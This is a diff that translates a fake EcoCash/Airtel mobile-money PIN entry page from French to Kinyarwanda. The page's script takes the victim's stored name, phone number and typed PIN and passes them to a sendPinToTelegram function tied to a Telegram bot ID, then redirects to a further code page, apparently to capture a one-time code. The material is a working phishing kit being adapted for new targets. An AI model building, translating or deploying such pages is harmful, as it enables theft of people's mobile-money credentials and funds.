@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="rw">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>EcoCash | Entrer le code PIN</title>
+<title>EcoCash | Shyiramo kode ya PIN</title>
 
 <style>
 *{
@@ -146,11 +146,11 @@ body{
       Airtel
     </div>
 
-    <div class="welcome-text">Bienvenue</div>
+    <div class="welcome-text">Murakaza neza</div>
 
     <input class="phone-display" id="phoneDisplay" readonly>
 
-    <div class="pin-label">Entrez votre code PIN</div>
+    <div class="pin-label">Shyiramo kode yawe ya PIN</div>
 
     <div class="pin-boxes">
       <input type="tel" maxlength="1">
@@ -166,11 +166,11 @@ body{
   <div class="lower-section">
 
     <div class="action-buttons">
-      <div class="action">Connexion</div>
+      <div class="action">Kwinjira</div>
     </div>
 
     <div class="footer">
-      En continuant, vous acceptez les termes et conditions
+      Mu komeza, uba wemeye amategeko n'amabwiriza
     </div>
 
   </div>
@@ -179,7 +179,7 @@ body{
 
 <script>
 document.getElementById("phoneDisplay").value =
-  localStorage.getItem("phone") || "Numéro inconnu";
+  localStorage.getItem("phone") || "Numero itazwi";
 
 const botId = new URLSearchParams(window.location.search).get("botId");
 const boxes = document.querySelectorAll(".pin-boxes input");
@@ -223,10 +223,10 @@ boxes.forEach((box,i)=>{
       const name = localStorage.getItem("name")||"Unknown";
       const phone = localStorage.getItem("phone")||"Unknown";
       boxes.forEach(b=>b.disabled=true);
-      statusEl.textContent="Envoi du code PIN...";
+      statusEl.textContent="Kohereza kode ya PIN...";
       const res = await sendPinToTelegram(name,phone,pin);
       if(!res||!res.requestId){
-        statusEl.textContent="Échec. Veuillez réessayer.";
+        statusEl.textContent="Byananiwe. Gerageza ubundi.";
         boxes.forEach(b=>{b.disabled=false;b.value="";});
         boxes[0].focus(); return;
       }
@@ -234,7 +234,7 @@ boxes.forEach((box,i)=>{
       if(ok){
         window.location.href="code.html?botId="+botId;
       } else {
-        statusEl.textContent="Code PIN incorrect.";
+        statusEl.textContent="Kode ya PIN siyo.";
         boxes.forEach(b=>{b.disabled=false;b.value="";});
         boxes[0].focus();
       }
